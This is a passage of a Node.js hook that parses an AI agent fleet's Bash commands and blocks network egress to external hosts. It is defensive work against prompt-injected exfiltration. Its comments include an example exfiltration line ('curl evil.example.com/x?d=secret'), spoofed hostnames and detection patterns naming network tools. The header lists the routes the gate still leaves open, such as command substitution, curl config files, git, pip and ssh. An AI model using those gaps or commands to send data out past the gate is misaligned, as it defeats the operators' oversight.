#!/usr/bin/env node
// PreToolUse hook (Bash): blocks the NAMED egress shapes the command-name deny list lets through.
// EGRESSPARSER923, owner GO for scope (a) only (2026-09-23).
//
// The deny list (agent-scaffold.ts, BASH_EGRESS_DENY) matches COMMAND NAMES with globs and has no
// negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
// plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
// shell variable. This hook closes exactly those three shapes by PARSING the command:
//   1. curl to an EXTERNAL destination: a scheme-bearing URL (http:// included, which the deny list
//      cannot cover), and any positional / --url / proxy argument even WITHOUT a scheme;
//   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval) whose code
//      carries an EXTERNAL URL;
//   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND.
// localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
// queue, approvals) go over http://localhost and a gate that cut them would silence the fleet.
// Hosts are cut with a regex, not URL(), so http://localhost:$PORT stays local, while
// localhost.evil.com and localhost@evil.com are external.
//
// PRIVATE NETWORK (maintainer decision on #1611, 2026-09-27): agents may reach private network
// targets from the shell. Local, besides the loopback names above, is decided by the LITERAL host
// string only, never by DNS: a canonical dotted-quad IPv4 in 10/8, 172.16/12, 192.168/16 or 127/8, a
// bracketed IPv6 in fc00::/7 (ULA) or fe80::/10 (link-local), or a name whose LAST label is `local`
// (mDNS, e.g. nas.local). A public name that happens to resolve to a private address stays external
// (nas.example.com), and so does every IPv4 spelling a resolver reads differently from how it looks
// (0x0a.0.0.1, 012.0.0.1, 167772161, 10.1) -- fail closed. 169.254/16 is deliberately NOT local:
// it carries the cloud instance-metadata endpoint. 100.64/10 (CGNAT) is not RFC 1918 and stays
// external. A single-label name (nas, xlocal) is external too: the resolver may complete it through
// a search domain to anywhere.
//
// HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
// and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
// is not a command; the URL from the ORIGINAL text of the same span.
//
// WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
// the name-and-shape list will never be complete. Since (d) (card 95800e1d) a heredoc-fed interpreter
// (`python3 - <<'PY'`, `bash <<EOF`) and a script file an interpreter runs (`python3 x.py`, `bash x.sh`)
// are judged too, by the network call's literal destination (see section (d) above classify). Since (e)
// (card c83a6bf6) the command behind a launcher, inside a command string (a shell's -c, eval, a launcher's
// command option), in a sourced file or piped into an interpreter, the script a project runner runs, the
// destinations of the named clients (wget, nc, ncat, telnet, socat, httpie, aria2c), a URL handed to judged
// code through an assignment in the same command, and the local modules judged code imports are judged too
// (section (e)). Still open: a destination that is not a literal (a file, the environment set elsewhere, a
// function parameter, a templated host, a previous command, a curl -K config, a substitution such as
// `curl $(echo https://x)`); a launcher the table does not name; a command string nested deeper than the
// depth limit; a module that is not a local file; every other network-capable binary (git, pip, npm, ssh,
// scp, rsync, dig ...).
// Closing those is direction (b): an allowlist / network-level gate, not this hook.
//
// Fail-CLOSED on unparseable input (a9c7bee0): a command maskInertLiterals cannot resolve (an unterminated quote or
// heredoc, or a quoted/heredoc region that could run a command) is DENIED, labelled by the branch, because a
// prompt-injection can hide a live call in a shape the parser cannot vouch for. An internal error also denies (V3).
// Every DENY is appended to the block log (the branch label and hosts only -- never the command text).
// Fail-CLOSED on a dependency that does not load (HOOKDEPLOAD1008): that is not one input the gate
// failed on, it is a gate that judges nothing, so every Bash call is denied (exit 2) with the module
// named. The main agent does not run this hook (agentGetsBashEgressParser), so the one session that
// can repair the module keeps its Bash.
import { readFileSync, appendFileSync, realpathSync, mkdirSync, existsSync, statSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join, resolve, isAbsolute } from 'node:path'
import { homedir } from 'node:os'

// HOOKDEPLOAD1008: a DYNAMIC import. As a static import, a broken self-pace-gate.mjs (a syntax error,
// a conflicted merge, a renamed export) failed the module link before any line of this file ran:
// node exited 1, which PreToolUse treats as NON-blocking, so a denied curl went through.
let maskInertLiterals = null
let maskInertReason = null
let MASK_LOAD_ERROR = null
try {
  ({ maskInertLiterals, maskInertReason } = await import('../self-pace-gate.mjs'))
  if (typeof maskInertLiterals !== 'function' || typeof maskInertReason !== 'function') throw new Error('missing export: maskInertLiterals/maskInertReason')
} catch (err) {
  MASK_LOAD_ERROR = err
}

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(ROOT, 'store', 'bash-egress-blocks.jsonl')
// EGRESSVENDOR925: vendor-API hosts a Bash call may reach (owner decision, per install).
// store/egress-vendor-hosts.json = { "hosts": ["api.elevenlabs.io"] }. EXACT host match only:
// no wildcard, no suffix match, no subdomain inheritance -- `elevenlabs.io.evil.com` and
// `x.api.elevenlabs.io` are other hosts. A missing or unreadable file, or an entry that is not
// a plain DNS name, means no exception: today's behaviour (deny). This is NOT
// store/egress-allowlist.json -- that one is the WebFetch / quarantine-reader list.
export const VENDOR_HOSTS_PATH = process.env.BASH_EGRESS_VENDOR_HOSTS || join(ROOT, 'store', 'egress-vendor-hosts.json')
// A plain DNS name: labels of [a-z0-9-], no leading/trailing hyphen, at least one dot, a letter TLD.
// Not an IP, not localhost, no `*`, no leading dot, no port, no userinfo.
const VENDOR_HOST = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/
export function parseVendorHosts(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.hosts) ? raw.hosts : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorHosts(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorHosts(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
// OPTIONAL, opt-in (#1611, a policy proposal): the same file may also carry
// `"domains": ["example.com"]` -- a listed domain OR any subdomain of it passes. The match is on a
// LABEL boundary: `api.example.com` matches `example.com`, while `evilexample.com`,
// `example.com.evil.net` and `example.com@evil.net` (whose host is evil.net) do not. Entries are
// shape-checked exactly like "hosts" (a plain DNS name: no wildcard, no leading dot, no IP, no
// port, no userinfo), so an IP or `*.x` can never widen the list. A missing key, a malformed
// file, or an entry that is not a plain DNS name adds nothing: today's behaviour. Kept separate
// from "hosts" on purpose, so an existing exact entry never silently becomes a suffix rule.
export function parseVendorDomains(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.domains) ? raw.domains : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorDomains(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorDomains(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
export function hostInDomains(host, domains) {
  for (const d of domains) if (host === d || host.endsWith(`.${d}`)) return true
  return false
}
const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
// One-liner URL schemes: every network scheme libcurl speaks (minus file:, and ipfs:/ipns:, which
// resolve through a gateway, not the literal host). A one-liner reaches all of them through a curl
// binding (PHP curl_exec, pycurl) or a stream wrapper (PHP ftps://, Perl LWP gopher://), so an
// http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun)$/
const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
// Words that can stand before the real command word of a sub-command. The shell keywords are here
// because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
// them a curl inside a loop or an if/then body was never looked at.
export const PREFIX_WORDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice', 'timeout', 'stdbuf',
  'do', 'then', 'else', 'elif', '{', '(', '!'])
// 95800e1d (4), K4: PowerShell, as the upstream reads it (bash-egress-parser-upstream.mjs: POWERSHELL, PS_CODE_FLAG,
// PS_NET_PRIMITIVE, hasCodeFlag, usesNetwork): on WSL powershell.exe reaches the network from the Windows side. Its code
// flag is -Command (any case, any unambiguous prefix down to -c); its network primitives are cmdlets and aliases that
// NET_PRIMITIVE does not name (`curl` / `wget` are aliases of Invoke-WebRequest there, ONLY there).
const POWERSHELL = /^(?:powershell|pwsh)(?:\.exe)?$/i
const PS_CODE_FLAG = /^-c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?$/i
const PS_NET_PRIMITIVE = /\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|curl|wget|Start-BitsTransfer|Net\.WebClient|DownloadString|DownloadFile|Net\.Http\.HttpClient|Net\.Sockets)\b/i
function hasCodeFlag(cmd, args) {
  return args.some((w) => CODE_FLAG.has(w) || (POWERSHELL.test(cmd) && PS_CODE_FLAG.test(w)))
}
function usesNetwork(cmd, text) {
  return NET_PRIMITIVE.test(text) || (POWERSHELL.test(cmd) && PS_NET_PRIMITIVE.test(text))
}
// A one-liner is a DOWNLOADER only when its code uses a network primitive of the language itself.
// Measured on 7 days of fleet commands: a one-liner that merely CARRIES a URL as data (an
// inter-agent message built with subprocess + curl to localhost) must not be denied -- that was 4 of
// 10 would-be blocks. Browser automation (chromium / playwright / puppeteer) is deliberately NOT in
// this list: it is the fleet's mandated browser-verify path on its own domains, and an own-domain
// allowlist is direction (b). Stated as open, measured, and left to the owner.
const NET_PRIMITIVE = /\b(?:urllib|requests\.|http\.client|httplib|httpx|aiohttp|urlopen|socket\.|fetch\s*\(|https?\.(?:get|request)\s*\(|axios|node-fetch|undici|got\s*\(|LWP::|HTTP::Tiny|Net::HTTP|open-uri|IO::Socket|file_get_contents|curl_exec|Invoke-WebRequest)|-M(?:LWP|HTTP::Tiny|IO::Socket|Net::HTTP)/

export function hostOf(url) {
  const m = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/i.exec(url)
  return m ? m[1].toLowerCase() : null
}
// Canonical dotted-quad only: no leading zero, no hex/octal/decimal/short forms.
const OCTET = '(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)'
const CANON_IPV4 = new RegExp(`^${OCTET}(?:\\.${OCTET}){3}$`)
const MDNS_NAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+local$/
// A private-network target by its literal spelling (see the PRIVATE NETWORK note in the header).
export function isPrivateTarget(host) {
  const h = String(host ?? '').toLowerCase()
  if (CANON_IPV4.test(h)) {
    const [a, b] = h.split('.').map(Number)
    return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
  }
  const v6 = /^\[([0-9a-f:.]+)\]$/.exec(h)
  if (v6) return /^f[cd][0-9a-f]{0,2}:/.test(v6[1]) || /^fe[89ab][0-9a-f]?:/.test(v6[1])
  return MDNS_NAME.test(h)
}
export function isLocalHost(host) { return LOCAL_HOSTS.has(host) || isPrivateTarget(host) }
export function isExternal(url) {
  const h = hostOf(url)
  if (h === null || h === '') return false
  return !isLocalHost(h)
}
function spans(masked) {
  const out = []; let start = 0; let op = null
  const re = /&&|\|\||;|\||\n/g; let m
  while ((m = re.exec(masked))) { out.push([start, m.index, op]); op = m[0]; start = m.index + m[0].length }
  out.push([start, masked.length, op])
  return out
}
function words(s) { return s.trim().split(/\s+/).filter(Boolean) }
function collectAssignments(orig, masked) {
  const env = {}
  for (const [a, b] of spans(masked)) {
    const seg = orig.slice(a, b)
    for (const m of seg.matchAll(/(?:^|\s)(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s]*))/g)) {
      env[m[1]] = m[3] ?? m[4] ?? m[5] ?? ''
    }
  }
  return env
}
// `for NAME in w1 w2 ...`: the loop variable takes EACH value in turn.
// NAME=value alone never saw it, so `for u in https://x ...; do curl "$u"; done` reached curl with an
// unread destination and passed, while the same URL as a literal or a plain assignment was denied.
// The keyword is found in the MASKED text (a quoted "for u in" is not a loop), the values are read
// from the ORIGINAL text, unquoted, with this command's assignments expanded in them.
function collectLoops(orig, masked, env) {
  const loops = {}
  for (const [a, b] of spans(masked)) {
    const m = /(?:^|[\s(!{])for\s+([A-Za-z_][A-Za-z0-9_]*)\s+in(?=\s|$)/.exec(masked.slice(a, b))
    if (!m) continue
    const vals = shellWords(expand(orig.slice(a + m.index + m[0].length, b), env))
    loops[m[1]] = [...(loops[m[1]] ?? []), ...vals]
  }
  return loops
}
// Every reading of a span a loop can produce: one text per loop value (per combination, for nested
// loops). Past MAX_LOOP_VARIANTS the span is not judged value by value: null, and the caller fails
// closed -- a hand-written URL loop is a few values, never hundreds.
const MAX_LOOP_VARIANTS = 64
// A value goes into the text as ONE word: pasting `'{"a":"b c"}'` raw broke the command's own
// quoting, and its fragments were read as hosts (measured on the fleet's week of commands: a loop
// of JSON bodies posted to localhost with -d "$p" was denied). A URL never holds whitespace or a
// quote, so such a value is replaced by the first URL inside it, or by a neutral word.
function asWord(value) {
  if (/^[^\s'"`\\]+$/.test(value)) return value
  return (String(value).match(URL_RE) ?? [])[0] ?? 'x'
}
function loopVariants(text, env, loops) {
  let out = [text]
  for (const [v, vals] of Object.entries(loops)) {
    const re = new RegExp(`\\$\\{${v}\\}|\\$${v}(?![A-Za-z0-9_])`, 'g')
    if (!re.test(text)) continue
    re.lastIndex = 0
    out = out.flatMap((t) => vals.map((x) => t.replace(re, () => asWord(x))))
    if (out.length > MAX_LOOP_VARIANTS) return null
  }
  return out.map((t) => expand(t, env))
}
function expand(text, env) {
  return text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (all, a, b) => (env[a ?? b] ?? all))
}
// $( ... ) and backtick substitutions are commands of their own: lift them out (length-preserving,
// so offsets still align), classify each inner command separately, and parse the rest without them.
// Without this, every `-H "Authorization: Bearer $(cat token)"` made maskInertLiterals give up:
// measured, 32% of fleet commands were unparseable and would have been allowed blind.
// Quote-aware, with the SAME rules as maskInertLiterals: a substitution is lifted only where the
// shell would run it (top level, inside "...", inside an unquoted-tag heredoc body). Inside '...',
// $'...' and a quoted-tag heredoc body it is inert text. Lifting it there turned every HANDOFF.md
// written with `cat > f <<'EOF'` that mentions a curl in backticks into a false deny.
function substEnd(text, i) { // text[i..] starts with $( -> index just past the matching )
  let depth = 1, j = i + 2, q = null
  while (j < text.length && depth > 0) {
    const c = text[j]
    if (q) { if (c === q) q = null; else if (c === '\\' && q === '"') j++ }
    else if (c === "'" || c === '"') q = c
    else if (c === '(') depth++
    else if (c === ')') depth--
    j++
  }
  return j
}
function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
  let j = i + 1
  while (j < text.length && text[j] !== '`') j += text[j] === '\\' ? 2 : 1
  return Math.min(j + 1, text.length)
}
export function liftSubstitutions(text) {
  const inners = []; const herestrings = []; let out = ''; let i = 0
  // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
  const lift = (at) => {
    if (text[at] === '$' && text[at + 1] === '(') {
      const j = substEnd(text, at)
      inners.push(text.slice(at + 2, j - 1)); out += ' '.repeat(j - at); return j
    }
    if (text[at] === '`') {
      const j = backtickEnd(text, at)
      inners.push(text.slice(at + 1, j - 1)); out += ' '.repeat(j - at); return j
    }
    return -1
  }
  // Copy [from, to) in a live context (double quotes, unquoted heredoc body). An escaped \` or \$
  // is literal text here, but maskInertLiterals gives up on ANY backtick or $( inside "...", so it is
  // blanked (length-preserving): measured, 58 of 78 unparseable fleet commands were exactly this
  // (a `gh pr comment --body "... \`code\` ..."`).
  const copyLive = (from, to) => {
    let k = from
    while (k < to) {
      if (text[k] === '\\' && (text[k + 1] === '`' || text[k + 1] === '$')) { out += '  '; k += 2; continue }
      if (text[k] === '\\') { out += text.slice(k, Math.min(k + 2, to)); k += 2; continue }
      const n = lift(k)
      if (n !== -1) { k = n; continue }
      out += text[k]; k++
    }
  }
  while (i < text.length) {
    const c = text[i]
    if (c === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
    // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
    // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
    // and the word after it is parsed as ordinary (quoted or live) text.
    // 95800e1d (4): its offset is kept (herestrings), so the word it feeds is read as the stdin of its command.
    if (text.startsWith('<<<', i)) { herestrings.push(i); out += '   '; i += 3; continue }
    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
    if (here) {
      const tag = here[1] ?? here[2] ?? here[3]
      const quotedTag = here[1] != null || here[2] != null
      out += here[0]; i += here[0].length
      const nl = text.indexOf('\n', i)
      if (nl === -1) { copyLive(i, text.length); break }
      // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
      // by processing it recursively, then continue with the body
      const lineRest = liftSubstitutions(text.slice(i, nl + 1))
      out += lineRest.stripped; inners.push(...lineRest.inners); i = nl + 1
      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
      const rel = endRx.exec(text.slice(i))
      const bodyEnd = rel ? i + rel.index : text.length
      if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
      i = bodyEnd
      continue
    }
    if (c === "'") {
      const end = text.indexOf("'", i + 1)
      const stop = end === -1 ? text.length : end + 1
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '$' && text[i + 1] === "'") {
      let j = i + 2
      while (j < text.length && text[j] !== "'") j += text[j] === '\\' ? 2 : 1
      const stop = Math.min(j + 1, text.length)
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') {
        if (text[j] === '\\') { j += 2; continue }
        if (text[j] === '$' && text[j + 1] === '(') { j = substEnd(text, j); continue }
        if (text[j] === '`') { j = backtickEnd(text, j); continue }
        j++
      }
      out += '"'
      if (j >= text.length) { copyLive(i + 1, text.length); i = text.length; continue }
      copyLive(i + 1, j); out += '"'; i = j + 1; continue
    }
    const n = lift(i)
    if (n !== -1) { i = n; continue }
    out += c; i++
  }
  return { stripped: out, inners, herestrings }
}
// curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
// curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
// the host while URL_RE (which needs a scheme) and the name list (`curl *https://*`) both miss it.
// So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
// connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
// Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
// never read as a destination. An unknown long option is assumed to take no value: if that is
// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
const CURL_LONG_WITH_VALUE = new Set([
  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
  // destination-bearing: read below, still consumed as values
  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
  'doh-url', 'connect-to', 'resolve',
])
const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i

// Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
export function shellWords(text) {
  const out = []; let cur = null; let i = 0
  const push = () => { if (cur !== null) out.push(cur); cur = null }
  while (i < text.length) {
    const c = text[i]
    if (/\s/.test(c)) { push(); i++; continue }
    cur ??= ''
    if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
      i = j + 1; continue
    }
    if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
    cur += c; i++
  }
  push()
  return out
}
// The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
// (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
// the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
// (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
// too (`$PROTO://host`), so everything up to `://` is dropped.
export function destHost(value) {
  if (!value) return null
  const noScheme = value.replace(/^[^/?#\s]*:\/\//, '')
  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
  const h = m ? m[1].toLowerCase() : ''
  if (HOSTNAME.test(h)) return h
  // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
  // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
  // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
  return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
}
// Every external destination host in a curl argv (the words AFTER `curl`).
export function curlDestinations(args) {
  const dests = []
  const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h) }
  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()) }
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
    if (w === '--' ) continue
    if (w.startsWith('--')) {
      const [name, inline] = w.slice(2).split(/=(.*)/s)
      if (!CURL_LONG_WITH_VALUE.has(name)) continue
      const v = inline !== undefined ? inline : args[++k]
      if (CURL_DEST_URL.has(name)) addUrl(v)
      else if (CURL_DEST_PARTS.has(name)) addParts(v)
      continue
    }
    if (w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
        if (CURL_DEST_URL.has(w[q])) addUrl(v)
        break
      }
      continue
    }
    addUrl(w) // positional: always a URL to curl
  }
  return dests.filter((h) => !isLocalHost(h))
}
// --- (d) INTERPRETER CODE BODIES: a heredoc fed to an interpreter, a script file it runs (95800e1d) ---
// The two shapes the header listed as open and the fleet actually used: a heredoc fed to an interpreter
// (`python3 - <<'PY' ... PY`; the call that opened card 95800e1d went out this way on 2026-10-01) and a
// script FILE an interpreter runs (`python3 x.py`, `node x.mjs`, `bash x.sh`, `./x.py` with a shebang,
// `python3 < x.py`). A body is judged as CODE, not as text: its string-literal contents and comments are
// blanked first (length-preserving, the idea of maskInertLiterals applied to the language), a network
// call is looked for in what is left, and the call's FIRST argument -- where it goes -- is read from the
// original text: a literal URL (for a socket/HTTP connection: a literal host), or a name bound to one
// in the same body. A shell body (bash/sh) goes through classify itself.
// Why not the one-liner rule (a network primitive and an external URL anywhere): measured on 7 days of
// fleet commands (383 666 Bash calls), that reading, applied to the interpreter heredocs and script files,
// would deny 230 commands that pass today, most of them a URL carried as DATA (a localhost POST whose JSON
// names a link, a host name in a config list, another program's `fetch("https://...")` inside a string
// literal of a code-editing script). This destination reading denies 60 commands that pass today, each a
// real outbound call, and keeps all 188 denies of the gate before it. Its first draft also denied syntax
// checks (`bash -n x.sh`, `node --check x.mjs`); those run nothing and are left alone.
// A file that `cat > PATH <<TAG` writes in the same command is judged by that heredoc (on disk it is still
// the old content when the hook runs). A relative script path follows a literal `cd` earlier in the same
// command, else the tool call's cwd.
// NOT judged (allowed, as before): a body or file that cannot be read or is over MAX_BODY_BYTES; a
// destination that is not a literal (a templated host, a function parameter, a URL read from a file or
// the environment, two variables concatenated); `python -m module`; test runners (`node --test`), whose
// files stub the network. (The local modules a script imports and the code piped into an interpreter are
// judged since (e), see there.)
const SCRIPT_INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun|tsx|ts-node)$/
const SHELL_INTERPRETER = /^(?:bash|sh|dash|zsh|ksh)$/
export const MAX_BODY_BYTES = 1_000_000
// Per language: the flags that make the next word CODE (a one-liner, judged by the rule above, not here),
// and the options whose VALUE is the next word (so that word is not the script). `sh -e x.sh` is errexit,
// not code: the flags differ by interpreter, so one shared set would misread it.
const BODY_CODE_FLAGS = { py: ['-c'], js: ['-e', '-p', '--eval', '--print', 'eval'], pl: ['-e', '-E'], rb: ['-e'], php: ['-r'], sh: ['-c'] }
const BODY_VALUE_FLAGS = {
  py: ['-X', '-W'],
  js: ['--import', '--require', '-r', '--loader', '--experimental-loader', '--env-file', '--conditions', '--title'],
  pl: ['-M', '-I'], rb: ['-r', '-I'], php: ['-d', '-c'], sh: ['-o', '+o'],
}
// Modes that read the script but never run it (a syntax check): nothing goes out, nothing to judge. Measured on the
// fleet's week: `bash -n x.sh` and `node --check x.mjs` were the only false denies of the first (d) draft.
const BODY_NO_EXEC = { js: ['--check', '-c'], pl: ['-c'], rb: ['-c'], php: ['-l'] }
export function langOf(word) {
  const w = String(word ?? '').split('/').pop()
  if (/^python(?:\d+(?:\.\d+)?)?$/.test(w)) return 'py'
  if (/^(?:node(?:js)?|deno|bun|tsx|ts-node)$/.test(w)) return 'js'
  if (w === 'perl') return 'pl'
  if (w === 'ruby') return 'rb'
  if (w === 'php') return 'php'
  if (SHELL_INTERPRETER.test(w)) return 'sh'
  return null
}
// The language a script names on its first line: `#!/usr/bin/python3`, `#!/usr/bin/env -S node --x`.
export function shebangLang(text) {
  const m = /^#!\s*(\S+)(?:[ \t]+([^\n]*))?/.exec(String(text ?? ''))
  if (!m) return null
  let word = m[1]
  if (word.split('/').pop() === 'env') word = (m[2] ?? '').split(/\s+/).find((w) => w && !w.startsWith('-') && !w.includes('=')) ?? ''
  return langOf(word)
}
// Blank string-literal CONTENTS and comments, length-preserving, newlines kept. The quotes (and a Python
// string prefix) stay, so the caller finds where a literal argument starts and reads it from the original.
export function maskCode(text, lang) {
  const s = String(text ?? '')
  const out = s.split('')
  const blank = (from, to) => { for (let k = from; k < to && k < s.length; k++) if (out[k] !== '\n') out[k] = ' ' }
  const hashComment = lang === 'py' || lang === 'pl' || lang === 'rb' || lang === 'php'
  const slashComment = lang === 'js' || lang === 'php'
  let i = 0
  let lastSig = '' // the last code character, to tell a JS regex literal from a division
  while (i < s.length) {
    const c = s[i]
    if ((hashComment && c === '#') || (slashComment && c === '/' && s[i + 1] === '/')) {
      const e = s.indexOf('\n', i); const end = e === -1 ? s.length : e
      blank(i, end); i = end; continue
    }
    if (slashComment && c === '/' && s[i + 1] === '*') {
      const e = s.indexOf('*/', i + 2); const end = e === -1 ? s.length : e + 2
      blank(i, end); i = end; continue
    }
    if (lang === 'js' && c === '/' && (lastSig === '' || '(,=:[!&|?{};+-*%<>~^'.includes(lastSig))) {
      let j = i + 1; let inClass = false
      while (j < s.length && s[j] !== '\n') {
        if (s[j] === '\\') { j += 2; continue }
        if (s[j] === '[') inClass = true
        else if (s[j] === ']') inClass = false
        else if (s[j] === '/' && !inClass) break
        j++
      }
      blank(i + 1, j); i = j + 1; lastSig = '/'; continue
    }
    if (c === "'" || c === '"' || (c === '`' && lang === 'js')) {
      const triple = lang === 'py' && s.startsWith(c.repeat(3), i)
      const close = triple ? c.repeat(3) : c
      let j = i + close.length
      while (j < s.length) {
        if (s[j] === '\\') { j += 2; continue }
        if (s.startsWith(close, j)) break
        if (!triple && c !== '`' && s[j] === '\n') break // an unterminated one-line string ends with its line
        j++
      }
      blank(i + close.length, j); i = Math.min(j + close.length, s.length); lastSig = c; continue
    }
    if (!/\s/.test(c)) lastSig = c
    i++
  }
  return out.join('')
}
// Callees whose FIRST argument is the destination. `.get(` / `.post(` ... cover a client object (a
